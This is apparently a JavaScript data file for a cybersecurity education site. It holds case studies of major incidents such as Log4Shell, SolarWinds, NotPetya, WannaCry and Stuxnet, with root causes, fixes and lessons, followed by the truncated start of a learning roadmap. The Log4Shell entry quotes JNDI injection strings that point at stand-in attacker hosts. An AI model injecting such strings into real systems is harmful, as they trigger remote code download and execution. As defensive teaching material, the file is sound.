const e=[{id:"crowdstrike-2024",name:"CrowdStrike Falcon Sensor Outage",year:2024,date:"July 19, 2024",category:"Kernel Resilience & Supply-Chain Availability",domain:"Endpoint Security",severity:"GLOBAL AVAILABILITY CRISIS",estimatedImpact:"8.5M Windows Hosts BSOD // $5.4B+ Global Economic Loss",mitreTags:["Availability Failure","Ring-0 Kernel Driver","Channel File 291"],summary:"A defective rapid-response content configuration update pushed to the Windows kernel-mode CrowdStrike Falcon sensor triggered simultaneous Blue Screens of Death (BSOD) across 8.5 million critical systems worldwide.",whatHappened:"At 04:09 UTC on July 19, 2024, CrowdStrike distributed a routine Rapid Response Content update (`C-00000291*.sys`, Channel File 291) designed to detect newly observed named-pipe abuse techniques on Windows endpoints. Within minutes, approximately 8.5 million Windows workstations and servers across airlines, hospitals, emergency 911 centers, banks, and railway networks crashed into an unrecoverable boot loop (`PAGE_FAULT_IN_NONPAGED_AREA`), grounding over 5,000 commercial flights globally.",technicalRootCause:"The Falcon sensor driver (`CSAgent.sys`) executes in Windows Ring-0 (Kernel Mode) with unrestricted system privileges. Channel File 291 serves as a dynamic template instance consumed by the sensor's Content Interpreter. Due to a mismatch between the IPC template schema (which expected 21 input parameter fields) and the newly compiled Channel File 291 (which supplied 21 parameters where the runtime parser only validated bounds for 20), the kernel driver performed an out-of-bounds memory read at an invalid pointer (`0x000000000000009c`). In Ring-0 kernel space, any unhandled memory access violation immediately invokes `KeBugCheckEx()`, halting the entire operating system prior to network initialization.",theSolution:"Because affected machines crashed during early boot before network interfaces or remote management tools initialized—and many enterprise drives were protected by BitLocker full-disk encryption—IT administrators had to physically bootmillions of machines into Windows Safe Mode or WinRE, manually enter 48-digit BitLocker recovery keys, navigate to `C:\\Windows\\System32\\drivers\\CrowdStrike\\`, delete `C-00000291*.sys`, and reboot. CrowdStrike subsequently implemented strict schema bounds checking in the Content Interpreter and staged canary rings for all Rapid Response Content.",architecturalLessons:["Ring-0 Kernel Minimization: Security telemetry should migrate away from Ring-0 kernel drivers toward sandboxed user-mode APIs and eBPF-style verified bytecode engines (Microsoft Windows Resiliency Initiative).","Treat Content & Config as Code: Dynamic rule/template updates must undergo the same fuzz testing, static bounds checking, and progressive canary deployment rings (1% -> 10% -> 50% -> 100%) as binary driver compilation.","Out-of-Band Recovery Architecture: Critical infrastructure must maintain automated out-of-band hardware management (Intel vPro / iDRAC / PXE network recovery) and accessible, non-Self-Hosted BitLocker key vaults."]},{id:"change-healthcare-2024",name:"Change Healthcare ALPHV/BlackCat Ransomware",year:2024,date:"February 21, 2024",category:"Ransomware & Critical Healthcare Infrastructure",domain:"Identity & Access Management",severity:"CRITICAL INFRASTRUCTURE BREACH",estimatedImpact:"190M+ US Patient Records // $2.87B+ Total Remediation Cost",mitreTags:["T1078 Valid Accounts","T1133 External Remote Services","T1486 Data Encrypted for Impact"],summary:"Ransomware affiliate exploited a legacy Citrix remote access portal lacking Multi-Factor Authentication (MFA), paralyzing US pharmacy claims processing and exposing 190 million Americans' medical records.",whatHappened:"Threat actors affiliated with the ALPHV/BlackCat ransomware syndicate infiltrated Change Healthcare (a subsidiary of UnitedHealth Group that processes 15 billion healthcare transactions annually). After nine days of covert lateral movement and data exfiltration (over 4 TB of sensitive PII/PHI), the attackers deployed ransomware on February 21, 2024. Pharmacies, hospitals, and clinics nationwide were unable to process insurance claims or prescriptions for weeks.",technicalRootCause:"Initial access occurred on February 12, 2024, via an internet-facing Citrix Virtual Apps and Desktops portal that did not have Multi-Factor Authentication (MFA) enforced. Attackers used stolen credentials previously harvested by infostealer malware. Once inside the Citrix environment, the threat actors abused valid administrative credentials, performed Active Directory privilege escalation, extracted database credentials, exfiltrated terabytes of claims data, and encrypted core production systems.",theSolution:"UnitedHealth Group isolated the entire Change Healthcare network from external partner connections, rebuilt the claims clearinghouse infrastructure from scratch in clean cloud environments, rotated all certificates and credentials, enforced mandatory phishing-resistant MFA across 100% of external gateways, and ultimately paid a reported $22 million Bitcoin ransom (though a second group, RansomHub, later extorted them again after an affiliate dispute).",architecturalLessons:["Zero Exceptions for MFA: A single legacy Citrix, VPN, or RDP portal without MFA invalidates billions of dollars in perimeter security investments. Enforce 100% FIDO2/MFA coverage across all external entry points.","M&A Technical Debt Auditing: Following corporate acquisitions, newly acquired networks must be isolated via Zero Trust brokers until full identity, MFA, and EDR baselines are verified.","Blast-Radius Microsegmentation: Flat internal networks allow a single compromised VDI session to reach mission-critical clearinghouse databases."]},{id:"snowflake-2024",name:"Snowflake Multi-Tenant Cloud Extortion Campaign",year:2024,date:"May–June 2024",category:"Cloud Identity & Infostealer Credential Stuffing",domain:"Cloud Security",severity:"MASS CLOUD DATA EXFILTRATION",estimatedImpact:"165+ Enterprise Tenants (AT&T, Ticketmaster, Santander) // 560M+ Records",mitreTags:["T1555 Credentials from Password Stores","T1078.004 Cloud Accounts","T1530 Data from Cloud Storage"],summary:"Threat cluster UNC5537 systematically breached over 165 enterprise Snowflake customer environments using infostealer-harvested credentials on single-factor accounts lacking network allowlists.",whatHappened:"Rather than breaching Snowflake's core underlying platform, threat actor UNC5537 targeted hundreds of enterprise Snowflake customers—including Ticketmaster (560M users), AT&T (~110M customers' call logs), Santander, and Advance Auto Parts. Using automated reconnaissance tool 'rapeflake', the attackers logged directly into customer data warehouses, ran `SELECT *` queries across massive tables, staged the data, and extorted the victims.",technicalRootCause:"Third-party contractors and data engineers had previously infected their personal or unmanaged workstations with commodity infostealer malware (Lumma, RedLine, Vidar, Raccoon) years earlier. Because the victims failed to: (1) enforce MFA on Snowflake human and service accounts, (2) rotate credentials over multiple years, and (3) configure Snowflake Network Policies (IP allowlisting), the stolen username/password pairs still granted direct SQL query access to petabytes of production analytics data.",theSolution:"Snowflake and Mandiant released emergency IoCs (blocking 'rapeflake' client strings and anomalous ASN logins), while Snowflake introduced mandatory MFA enforcement policies for tenant administrators, forced password resets on exposed accounts, enforced OAuth/SAML SSO federation, and mandated IP network allowlists for programmatic service accounts.",architecturalLessons:["Shared Responsibility Reality Check: Cloud SaaS data warehouses cannot protect customers who configure single-factor authentication with static passwords exposed to the entire IPv4 internet.","Eliminate Static Passwords for Service Accounts: Programmatic ETL pipelines and BI tools must authenticate using key-pair cryptography (RSA/Ed25519), Workload Identity Federation (OIDC), or short-lived OAuth tokens restricted by strict IP/VPC allowlists.","Infostealer Telemetry Monitoring: Proactively monitor dark-web infostealer logs for corporate email domains and contractor endpoints."]},{id:"moveit-2023",name:"MOVEit Transfer Zero-Day Mass Exploitation (CVE-2023-34362)",year:2023,date:"May 27, 2023",category:"Zero-Day SQL Injection & Supply-Chain MFT Breach",domain:"Application Security",severity:"CRITICAL SUPPLY-CHAIN BREACH",estimatedImpact:"2,770+ Organizations // 95M+ Individuals Affected Globally",mitreTags:["T1190 Exploit Public-Facing App","T1505.003 Web Shell","T1005 Data from Local System"],summary:"The Cl0p ransomware group exploited a zero-day SQL injection flaw in Progress MOVEit Transfer managed file transfer appliances over Memorial Day weekend, exfiltrating data from 2,770+ organizations.",whatHappened:"During the US Memorial Day holiday in May 2023, the Cl0p extortion group launched a highly automated, mass-exploitation campaign against internet-facing Progress MOVEit Transfer servers. Instead of deploying noisy ransomware encryption, Cl0p silently deployed a custom `.aspx` web shell (`human2.aspx`), stole Azure Blob Storage credentials and cryptographic keys, exfiltrated sensitive files at scale, and extorted victims across government agencies, banks, airlines, and universities.",technicalRootCause:"CVE-2023-34362 was an unauthenticated SQL Injection vulnerability chained with an authentication bypass in the MOVEit Transfer web application (`moveitisapi.dll` and `guestaccess.aspx`). By sending crafted HTTP headers to the ISAPI extension, attackers bypassed session validation, forged an administrative session, and injected arbitrary SQL queries into the backend database (MSSQL/MySQL/Azure SQL). Using SQL injection or .NET deserialization primitives, the attackers wrote the `human2.aspx` web shell directly to the web root and extracted AES encryption keys to decrypt stored files.",theSolution:"Progress Software issued emergency patches disabling HTTP/HTTPS traffic until upgraded, provided indicators for `human2.aspx` removal, and forced rotation of all Azure Blob Storage keys and database credentials. Organizations migrated MFT appliances behind strict mutual-TLS (mTLS) gateways and Zero Trust proxies.",architecturalLessons:["Managed File Transfer (MFT) Appliances are Tier-0 Targets: After Accellion FTA, GoAnywhere, and MOVEit, edge MFT servers must never sit directly on the public internet without mTLS or IP allowlisting.","Ephemeral Storage on File Gateways: File transfer appliances should automatically purge transferred payloads immediately after delivery rather than serving as long-term archives of unmasked PII.","Parameterized Queries Everywhere: Complex header forwarding between C++ ISAPI filters and .NET backends must never concatenate raw strings into SQL statements."]},{id:"colonial-pipeline-2021",name:"Colonial Pipeline DarkSide Ransomware Shutdown",year:2021,date:"May 7, 2021",category:"OT/IT Convergence & Critical Energy Infrastructure",domain:"OT / ICS Security",severity:"CRITICAL ENERGY EMERGENCY",estimatedImpact:"5,500-Mile Fuel Pipeline Halted 6 Days // 45% US East Coast Fuel Supply",mitreTags:["T1078 Valid Accounts","T1133 VPN Single-Factor","IT-OT Convergence Shutdown"],summary:"A single compromised password on an inactive legacy VPN account lacking MFA allowed DarkSide ransomware operators to breach Colonial Pipeline's IT network, forcing a precautionary 6-day shutdown of the largest fuel pipeline in the United States.",whatHappened:"On May 7, 2021, Colonial Pipeline discovered ransomware notes from the DarkSide RaaS group across its corporate IT enterprise systems after attackers stole 100 GB of data in two hours. Fearing the attackers might pivot from the corporate IT billing/ERP environment into the Operational Technology (OT) SCADA systems controlling 5,500 miles of pressurized gasoline and jet fuel pipelines, Colonial halted all pipeline operations for 6 days, triggering panic buying and fuel shortages across the US East Coast.",technicalRootCause:"Attackers gained entry on April 29, 2021, through an inactive, legacy Cisco VPN profile belonging to an employee who had reused their password on another breached website. Although the VPN account was no longer actively used, it had never been deprovisioned in Active Directory and did not require Multi-Factor Authentication (MFA). Furthermore, insufficient architectural confidence in the isolation boundary between the corporate IT billing systems and the OT pipeline control network forced leadership to shut down physical operations.",theSolution:"Colonial Pipeline disconnected its IT systems, coordinated with CISA and Mandiant to eradicate DarkSide persistence, rebuilt Active Directory, enforced hardware MFA across all remote access, and paid a 75 BTC ($4.4M) ransom (of which the DOJ/FBI later seized back 63.7 BTC by compromising DarkSide's cryptocurrency wallet key).",architecturalLessons:["Strict IT/OT Purdue Model Isolation: Industrial physical operations (Purdue Levels 0–2) must be separated from corporate IT/billing (Levels 4–5) via an Industrial DMZ (Level 3.5) and unidirectional hardware Data Diodes so an IT ransomware event never forces a physical plant shutdown.","Automated Identity Lifecycle & Deprovisioning: Orphaned/inactive VPN and AD accounts must be automatically disabled after 30 days of inactivity.","Manual Island-Mode Operations: Critical infrastructure operators must drill manual/local control procedures to sustain physical flow when enterprise ERP/billing software goes offline."]},{id:"log4shell-2021",name:"Log4Shell: Apache Log4j2 JNDI Remote Code Execution (CVE-2021-44228)",year:2021,date:"December 9, 2021",category:"Ubiquitous Open-Source Supply Chain Zero-Day",domain:"Application Security",severity:"CVSS 10.0 UBIQUITOUS CRITICAL",estimatedImpact:"Hundreds of Millions of Java Servers, Cloud Services & Appliances",mitreTags:["T1190 Exploit Public-Facing App","JNDI Lookup Injection","CVE-2021-44228"],summary:"A single 15-character string (`${jndi:ldap://...}`) logged by Apache Log4j2 triggered unauthenticated Remote Code Execution across millions of Java servers worldwide.",whatHappened:"In December 2021, a critical CVSS 10.0 vulnerability was disclosed in `log4j-core`, the ubiquitous Java logging library embedded in everything from Minecraft servers and Apple iCloud to VMware vCenter, enterprise banking backends, and cloud infrastructure. Attackers simply placed `${jndi:ldap://attacker.com/a}` inside HTTP User-Agent headers, login forms, or chat messages; whenever the backend server logged the string, it fetched and executed remote attacker Java bytecode.",technicalRootCause:"Log4j2 version 2.0-beta9 through 2.14.1 included a feature called 'Message Lookup Substitution' enabled by default. When formatting any log message, Log4j parsed `${prefix:name}` expressions recursively. Crucially, it supported the Java Naming and Directory Interface (`jndi:`), which allowed dynamic lookups over `ldap://`, `rmi://`, `ldaps://`, and `dns://`. When Log4j evaluated `${jndi:ldap://evil.com/Exploit}`, the JVM connected out to the attacker's rogue LDAP server, downloaded a serialized Java `.class` file, and deserialized/executed it directly in the JVM process memory.",theSolution:"Apache released Log4j 2.15.0, 2.16.0, and ultimately 2.17.1+, which completely disabled message lookup substitution by default and removed JNDI LDAP remote class loading unless explicitly whitelisted. Organizations used SBOM scanners (Trivy, Syft, Grype) to hunt down nested `.jar` archives (JAR-inside-WAR-inside-EAR) and deployed strict egress firewall rules blocking outbound LDAP (389/636) and RMI (1099) traffic from application servers.",architecturalLessons:["Never Evaluate Untrusted Data as Code in Logging Sinkholes: Logging libraries must treat logged strings strictly as inert plaintext literals, never as executable expression templates.","Default-Deny Egress Filtering: Why could production web servers initiate outbound TCP connections to random internet IPs on port 389 (LDAP)? Strict egress firewalling breaks the JNDI callback chain immediately.","Deep Transitive SBOM Visibility: Most enterprises didn't know they used Log4j because it was buried 4 layers deep as a transitive dependency inside commercial vendor appliances."]},{id:"solarwinds-2020",name:"SolarWinds Orion SUNBURST Supply-Chain Compromise",year:2020,date:"December 13, 2020",category:"Nation-State CI/CD Build Pipeline Poisoning",domain:"Application Security",severity:"TIER-0 NATION-STATE ESPIONAGE",estimatedImpact:"18,000+ Organizations Installed Backdoor // 9 US Federal Agencies & FireEye",mitreTags:["T1195.002 Compromise Software Supply Chain","T1552.004 Private Keys","Golden SAML"],summary:"APT29 (Nobelium / Cozy Bear) compromised SolarWinds' internal software build pipeline, injecting the stealthy SUNBURST backdoor into digitally signed Orion network monitoring updates distributed to 18,000 customers.",whatHappened:"Discovered by FireEye in December 2020 after investigating a theft of their own Red Team tools, Russian foreign intelligence (SVR / APT29) had silently compromised SolarWinds' build environment months earlier. Between March and June 2020, SolarWinds unknowingly shipped trojanized, legitimately digitally signed updates (`SolarWinds.BusinessLayerHost.dll`) of its Orion IT monitoring platform to ~18,000 enterprise and government customers. The attackers then selectively activated hands-on-keyboard espionage against high-value targets (US Treasury, DOJ, Commerce, Microsoft, FireEye).",technicalRootCause:"Rather than modifying source code in Git (which would leave commit audit trails), the attackers deployed a resident build-server implant (`SUNSPOT`) that monitored running processes on the SolarWinds build server for `MSBuild.exe`. Whenever the Orion solution was being compiled, `SUNSPOT` swapped a clean C# source file (`InventoryManager.cs`) in milliseconds with a version containing the `SUNBURST` backdoor right before compilation, then restored the original file immediately after `MSBuild.exe` finished. Consequently, the malicious DLL was signed with SolarWinds' official code-signing certificate. Once deployed at victim sites, SUNBURST lay dormant for 12–14 days, mimicked legitimate Orion XML web traffic (`AVSVMCloud.com`), and enabled attackers to steal AD FS token-signing certificates to mint forged 'Golden SAML' tokens for cloud persistence.",theSolution:"SolarWinds revoked compromised code-signing certificates, rebuilt its build environment using ephemeral, hermetic, multi-stage verification pipelines, and released clean patches. Victims had to isolate Orion servers, rotate Active Directory `krbtgt` accounts twice, and revoke/re-issue all on-premises AD FS SAML token-signing certificates.",architecturalLessons:["SLSA Level 3/4 Hermetic & Reproducible Builds: Build servers must be ephemeral, immutable, isolated from corporate networks, and verified via deterministic reproducible compilation so source-to-binary tampering is mathematically detectable.","Zero Trust for Management & Monitoring Tools: Network management appliances (Orion) often hold god-mode credentials across the entire enterprise; their outbound internet access must be tightly restricted.","Protect Identity Signing Keys in Hardware HSMs: SAML token-signing private keys must reside inside FIPS 140-3 Hardware Security Modules (HSMs) so they cannot be exported by an administrator or attacker."]},{id:"notpetya-2017",name:"NotPetya Global Destructive Wiper Attack",year:2017,date:"June 27, 2017",category:"Destructive Wiper Worm & Supply-Chain Update Hijack",domain:"Endpoint Security",severity:"MOST DESTRUCTIVE CYBERATTACK IN HISTORY",estimatedImpact:"$10 Billion+ Global Damage (Maersk, Merck, FedEx/TNT, Mondelēz)",mitreTags:["T1195.002 Supply Chain","T1210 EternalBlue","T1003.001 LSASS Mimikatz","T1561.002 Disk Structure Wipe"],summary:"Sandworm (GRU Unit 74455) hijacked the Ukrainian M.E.Doc tax software update server to launch NotPetya—a self-propagating worm combining EternalBlue and Mimikatz that masqueraded as ransomware while permanently destroying Master Boot Records globally.",whatHappened:"On June 27, 2017, a devastating worm erupted from Ukraine and spread within minutes across multinational corporations worldwide. Shipping giant Maersk lost 45,000 endpoints and 4,000 servers (including all 150 Domain Controllers except one offline server in Ghana saved by a power outage); pharmaceutical giant Merck, FedEx subsidiary TNT Express, Saint-Gobain, and Reckitt Benckiser suffered hundreds of millions of dollars in operational paralysis.",technicalRootCause:"1) Initial Supply-Chain Vector: Attackers compromised the update servers of M.E.Doc, tax accounting software used by nearly every business operating in Ukraine.\n2) Dual-Engine Worm Propagation: Once inside a single workstation on a multinational corporate WAN (e.g., Maersk's small office in Odessa, Ukraine), NotPetya used a dual propagation engine: it ran an embedded copy of `Mimikatz` (`lsass.exe` credential dumping) to extract plaintext Domain Admin passwords/hashes from RAM and spread via `PsExec`/`WMIC` to fully patched machines, AND simultaneously fired the NSA `EternalBlue` (`MS17-010`) and `EternalRomance` SMBv1 exploits to infect unpatched machines.\n3) Irreversible Destruction: Although NotPetya displayed a $300 Bitcoin ransom screen, it generated a random 64-byte Salsa20 encryption key for the Master File Table (MFT) and immediately discarded the key without saving it—making decryption mathematically impossible (a pure destructive wiper).",theSolution:"Because decryption was impossible, victims had to rebuild tens of thousands of servers and workstations from bare metal. Maersk famously flew a single surviving hard drive from a Lagos/Ghana branch office (which had been offline due to a local blackout during the attack) to London to reconstruct its global Active Directory forest.",architecturalLessons:["Patching Alone Doesn't Stop Credential-Harvesting Worms: Even hosts patched against EternalBlue (`MS17-010`) were wiped by NotPetya because it stole valid Domain Admin credentials from `LSASS` memory via Mimikatz and used legitimate Windows WMI/PsExec.","Credential Hygiene & LSASS Protection: Enable Windows Credential Guard (VBS), enforce Tiered Administration (never log into workstations with Domain Admin accounts), and disable SMBv1 and NTLMv1.","Offline Air-Gapped Active Directory Backups: Always maintain immutable, offline backups of Tier-0 Active Directory Domain Controllers."]},{id:"wannacry-2017",name:"WannaCry EternalBlue SMBv1 Global Ransomware Worm",year:2017,date:"May 12, 2017",category:"Network Worm & SMBv1 Kernel Exploitation",domain:"Network Security",severity:"GLOBAL PANDEMIC RANSOMWARE WORM",estimatedImpact:"230,000+ Computers Across 150 Countries // UK NHS Paralyzed // $4B–$8B Loss",mitreTags:["T1210 Exploitation of Remote Services","MS17-010 EternalBlue","SMBv1 TCP Port 445"],summary:"Lazarus Group weaponized the leaked NSA 'EternalBlue' SMBv1 kernel exploit into a self-propagating ransomware worm that infected 230,000+ machines in 150 countries within hours, crippling the UK National Health Service (NHS).",whatHappened:"On Friday, May 12, 2017, WannaCry (`WannaCrypt0r 2.0`) began spreading autonomously across the global internet and internal corporate LANs without requiring any user clicks or phishing emails. Within hours, 80 UK National Health Service (NHS) hospital trusts were forced to divert ambulances and cancel surgeries; Telefónica, Deutsche Bahn railway terminals, Renault auto plants, and FedEx were hit simultaneously.",technicalRootCause:"In April 2017, the Shadow Brokers group leaked `EternalBlue` (CVE-2017-0144 / MS17-010), an exploit targeting a buffer overflow in the Windows Server Message Block version 1 (`SMBv1`) kernel driver (`srv.sys`). When handling crafted `FEA` (File Extended Attributes) structures in `SMB_COM_TRANSACTION2` packets over TCP Port 445, an integer conversion error (`DWORD` to `WORD`) allowed unauthenticated remote kernel pool memory corruption and Ring-0 code execution. WannaCry paired EternalBlue with the `DoublePulsar` kernel backdoor to scan both internal RFC1918 LAN subnets and random public IPv4 addresses on TCP 445, encrypting files with RSA-2048 + AES-128-CBC.",theSolution:"Security researcher Marcus Hutchins (`@MalwareTechBlog`) discovered an unregistered domain (`iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`) hardcoded in the WannaCry binary as an anti-sandbox check: if an HTTP request to that domain succeeded, WannaCry exited without encrypting. Registering the domain for $10.69 triggered a global 'kill switch' that halted new infections on internet-connected hosts. Microsoft also issued emergency out-of-band `MS17-010` patches even for end-of-life Windows XP and Server 2003.",architecturalLessons:["Never Expose SMB (TCP 445) or RDP (TCP 3389) to the Internet: Perimeter firewalls must unconditionally drop inbound and outbound SMB traffic.","Deprecate Legacy Protocols (SMBv1): SMBv1 was designed in the 1980s without encryption or modern bounds safety; disable `FS-SMB1` across all endpoints and servers.","East-West Workstation Firewalling: Workstations in an office subnet almost never need to accept inbound TCP 445 connections from peer workstations—host firewall rules block worm lateral propagation instantly."]},{id:"equifax-2017",name:"Equifax Apache Struts CVE-2017-5638 Data Breach",year:2017,date:"May–July 2017",category:"Unpatched Web Framework & Expired TLS Visibility Blindness",domain:"Application Security",severity:"CATASTROPHIC CONSUMER PII BREACH",estimatedImpact:"147.9 Million Consumers' SSNs, Birth Dates & Credit Data // $1.4B+ Settlement",mitreTags:["T1190 Exploit Public-Facing App","CVE-2017-5638 OGNL Injection","Expired TLS Inspection Cert"],summary:"An unpatched Apache Struts 2 vulnerability combined with an expired SSL/TLS inspection certificate allowed attackers to silently exfiltrate 147.9 million Americans' Social Security Numbers over 76 days.",whatHappened:"Between May 13 and July 30, 2017, attackers breached Equifax's online credit dispute portal, deployed web shells, discovered unencrypted credentials stored in plaintext configuration files on a file share, pivoted across 48 unrelated internal databases, ran 9,000 queries extracting 147.9 million consumers' Social Security Numbers, driver's license numbers, and birth dates, and exfiltrated the data in encrypted chunks over 76 days without triggering a single SOC alert.",technicalRootCause:"1) Vulnerability Management Failure: On March 7, 2017, Apache disclosed CVE-2017-5638, a critical Remote Code Execution flaw in the Apache Struts 2 Jakarta Multipart parser where malformed `Content-Type` HTTP headers executed arbitrary OGNL (Object-Graph Navigation Language) expressions. Although Equifax's security team circulated a patch directive on March 9, their automated vulnerability scanner failed to locate the legacy Struts dependency on the ACIS dispute portal.\n2) Network Visibility Blindness: Even worse, the network security appliance responsible for decrypting and inspecting outbound HTTPS traffic from the ACIS environment had an **expired SSL/TLS certificate for 19 months**. Because TLS decryption was silently failing, the IDS/IPS was completely blind for 76 days until an engineer finally renewed the certificate on July 29, 2017—and immediately saw live data exfiltration to China.",theSolution:"Equifax took the ACIS portal offline, retired the legacy Java monolith, spent $1.5 billion rebuilding its entire cloud and security architecture from the ground up, implemented automated certificate lifecycle management, enforced network microsegmentation between databases, and eliminated plaintext credential files.",architecturalLessons:["Software Composition Analysis (SCA) over Network Scanners Alone: External port scanners often miss deeply embedded framework libraries like Apache Struts; maintain an accurate SBOM tied to build pipelines.","Monitor the Monitors (TLS Inspection Health): Security sensors with expired TLS certificates create a fatal false sense of security. Automate X.509 certificate lifecycle monitoring.","Zero Trust Secrets Management: Never store database credentials in plaintext `.properties` or `.xml` files on shared network drives; use HashiCorp Vault or Cloud KMS."]},{id:"stuxnet-2010",name:"Stuxnet: Operation Olympic Games ICS/SCADA Sabotage",year:2010,date:"June 2010",category:"Cyber-Physical Kinetic Weapon & PLC Rootkit",domain:"OT / ICS Security",severity:"FIRST CYBER-PHYSICAL WEAPON",estimatedImpact:"~1,000 IR-1 Uranium Enrichment Centrifuges Physically Destroyed at Natanz",mitreTags:["T0843 Program Download","T0836 Modify Parameter","T0856 Spoof Reporting Message","4 Windows Zero-Days"],summary:"The world's first known cyber-physical weapon jumped an air gap via USB drives, leveraged four Windows zero-days, and injected a stealthy PLC rootkit into Siemens S7-315 controllers to physically destroy uranium enrichment centrifuges while playing back 'normal' telemetry to operators.",whatHappened:"Targeting the air-gapped Natanz nuclear enrichment facility in Iran, Stuxnet infected engineering laptops owned by outside industrial contractors. When those contractors carried infected USB flash drives inside the air-gapped facility, Stuxnet spread across the internal LAN until it located Windows workstations running Siemens STEP 7 industrial engineering software connected to Siemens S7-315 and S7-417 Programmable Logic Controllers (PLCs) driving IR-1 gas centrifuges.",technicalRootCause:"Stuxnet remains a masterpiece of multi-stage offensive engineering:\n1) Four Windows Zero-Days: It used `CVE-2010-2568` (`.LNK` shortcut file execution simply by viewing the USB drive in Windows Explorer), `CVE-2008-4250` (`MS08-067` Server Service RPC), a Print Spooler RCE (`CVE-2010-2729`), and two Win32k kernel privilege escalation zero-days, plus stolen real digital certificates from Realtek and JMicron to load signed kernel drivers.\n2) Surgical Target Validation: Stuxnet did nothing unless it verified the machine ran Siemens `STEP 7`, had a Profibus communications processor (`CP 342-5`), and was connected to specific Variable Frequency Drives (VFDs) manufactured by Fararo Paya (Iran) or Vacon (Finland) operating between 807 Hz and 1,210 Hz.\n3) PLC Man-in-the-Middle Rootkit (`s7otbxdx.dll`): Stuxnet trojanized the STEP 7 communication DLL, injected rogue ladder-logic blocks (`OB1` / `OB35`) onto the PLC to covertly spin the centrifuges up to 1,410 Hz (causing harmonic resonance and rotor disintegration) and down to 2 Hz, while simultaneously replaying 21 seconds of pre-recorded 'normal' 1,064 Hz telemetry to the human operators' HMI screens in the control room.",theSolution:"Siemens issued patches for STEP 7 DLL hijacking and hardcoded database passwords; Microsoft patched all four Windows zero-days; Realtek and JMicron revoked their compromised code-signing certificates; and industrial facilities implemented strict USB port locks, out-of-band analog physics sensors, and passive ICS network anomaly detection.",architecturalLessons:["Air Gaps Are Not Impervious: Transient assets—contractor laptops, USB flash drives, calibration tools—routinely bridge air-gapped OT networks. Enforce hardware USB locks and dedicated kiosks.","HMI Telemetry Can Lie (The Replay Fallacy): If the engineering workstation or PLC firmware is compromised, digital HMI screens will show 'All Green' while physical equipment tears itself apart. Critical safety interlocks (SIS) must use independent, hardwired analog relays.","Cryptographic Firmware & Ladder-Logic Signing: PLCs must verify cryptographic signatures on all ladder-logic uploads and enforce physical key-switch 'RUN-ONLY' modes."]}],t=[{id:"stage-1",stageNumber:"STAGE 01",title:"IT, OS & Networking Foundations",timeline:"Months 1–3 // Zero-to-Operator Core",accent:"cyan",description:"Every elite security engineer, SOC analyst, and penetration tester stands on deep systems engineering foundations. You cannot defend or exploit an operating system or network protocol you do not fundamentally understand.",nodes:[{id:"node-virt-hardware",code:"1.1",title:"Computer Architecture, Memory & Virtualization Labs",subtitle:"CPU Rings, RAM/Stack/Heap, Proxmox, VMware & Isolated Home Labs",estimatedHours:"35 hrs",difficulty:"Foundational",whyItMatters:"Understanding CPU privilege rings (Ring 0 Kernel vs Ring 3 User Mode), x86_64 virtual memory layout (Stack vs Heap), UEFI Secure Boot, and TPM 2.0 is essential for analyzing buffer overflows, kernel rootkits, and building safe malware detonation sandboxes.",topicsToMaster:["x86_64 & ARM64 CPU Privilege Rings (Ring 0 Kernel Space vs Ring 3 User Space) & System Calls","Process Memory Layout: Text Segment, Data/BSS, Heap (dynamic allocation), and Stack frames (RSP/RBP)","Type-1 (Proxmox VE, ESXi, KVM) vs Type-2 Hypervisors (VirtualBox, VMware Workstation) & Snapshot isolation","Building an isolated Dual-NIC Home Lab: pfSense Firewall VM + Kali Linux + Ubuntu Server + Windows Server AD","Container Virtualization Internals: Linux namespaces (`pid`, `net`, `mnt`, `user`), `cgroups`, and `seccomp-bpf`"],handsOnLabs:[{platform:"pwnable.kr",name:"Toddler's Bottle (System Binary Exploitation & Memory Layout)",url:"https://pwnable.kr"},{platform:"TryHackMe",name:"Pre-Security & Linux Strength Training Track",url:"https://tryhackme.com"},{platform:"picoCTF",name:"General Skills & Binary Warmup Challenges",url:"https://picoctf.org"},{platform:"CTFtime",name:"Global Live CTF Event Calendar & Writeups",url:"https://ctftime.org"}],recommendedTools:["VirtualBox / Proxmox","Docker","pfSense CE"]},{id:"node-os-deepdive",code:"1.2",title:"Linux & Windows Internals & CLI Mastery",subtitle:"Bash, systemd, File Permissions, Windows Registry, LSASS & Active Directory",estimatedHours:"55 hrs",difficulty:"Foundational",whyItMatters:"90%+ of cloud infrastructure runs on Linux while 85%+ of Fortune 500 corporate identities run on Windows Active Directory. Mastering both command lines and OS internals is mandatory.",topicsToMaster:["Linux File System Hierarchy (`/etc/passwd`, `/etc/shadow`, `/proc`, `/var/log/auth.log`), SUID/SGID bits, and POSIX ACLs","Linux Text Processing & Pipeline Automation: `grep -E`, `awk`, `sed`, `jq`, `find`, `xargs`, `systemctl`, and `journalctl`","Linux Mandatory Access Control (SELinux / AppArmor) and `auditd` syscall logging","Windows Internals: Process tree (`System` -> `smss.exe` -> `csrss.exe` -> `wininit.exe` -> `services.exe` -> `lsass.exe`)","Windows Registry Hives (`HKLM`, `HKCU`, `SAM`, `SYSTEM` Run keys), PowerShell scripting, and Active Directory GPOs"],handsOnLabs:[{platform:"OverTheWire",name:"Bandit (Levels 0 to 34 Linux CLI Wargame)",url:"https://overthewire.org/wargames/bandit/"},{platform:"pwnable.tw",name:"Advanced Linux Binary & Kernel Exploitation Wargame",url:"https://pwnable.tw"},{platform:"TryHackMe",name:"Windows Internals, Linux PrivEsc & Active Directory Basics",url:"https://tryhackme.com"},{platform:"HackTheBox Academy",name:"Linux Fundamentals & Windows Command Line Modules",url:"https://academy.hackthebox.com"}],recommendedTools:["OSQuery","Velociraptor","CISA LME"]},{id:"node-networking",code:"1.3",title:"TCP/IP Networking, Subnetting & Core Protocols",subtitle:"7-Layer OSI, TCP Handshakes, CIDR, VLANs, DNS, HTTP/2, TLS & BGP",estimatedHours:"50 hrs",difficulty:"Foundational",whyItMatters:"Every cyber attack crosses a network boundary or manipulates a protocol state machine. Deep packet literacy separates true security engineers from tool button-pushers.",topicsToMaster:["7-Layer OSI Model encapsulation (Bits -> Frames -> Packets -> Segments -> Session/Presentation/Application Data)","TCP 3-Way Handshake (`SYN`, `SYN-ACK`, `ACK`), TCP Flags (`RST`, `FIN`, `PSH`, `URG`), and UDP statelessness","IPv4/IPv6 CIDR Subnetting (`/24`, `/16`, `/32`), RFC 1918 Private Ranges, NAT/PAT, ARP resolution, and 802.1Q VLAN tagging","Critical Ports & Protocols: SSH (22), DNS (53), Kerberos (88), SMB (445), LDAP/S (389/636), RDP (3389), Modbus (502)","Deep Packet Inspection (DPI) with Wireshark display filters and `tcpdump` Berkeley Packet Filters 